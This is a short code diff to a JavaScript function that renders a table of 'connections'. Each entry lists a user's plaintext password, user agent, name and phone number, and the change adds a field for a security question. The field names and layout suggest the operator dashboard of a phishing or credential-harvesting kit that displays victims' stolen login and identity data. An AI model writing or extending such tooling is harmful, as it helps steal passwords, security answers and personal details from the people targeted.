@@ -127,6 +127,8 @@ function updateConnectionsTable(users) {
             <li class="list-group-item">Password: ${details.getUserDataLogin.password || ''}</li>
             <li class="list-group-item">UserAgent: ${details.getUserDataLogin.userAgent || ''}</li>
               <li class="list-group-item">----------------------------------------------------------</li>
+              <li class="list-group-item">Question: ${details.getUserDataQuestion || ''}</li>
+                <li class="list-group-item">----------------------------------------------------------</li>
             <li class="list-group-item">Fist Name: ${details.getUserDataDetails.fname || ''}</li>
             <li class="list-group-item">Last Name: ${details.getUserDataDetails.lname || ''}</li>
             <li class="list-group-item">Phone Number: ${details.getUserDataDetails.phone || ''}</li>
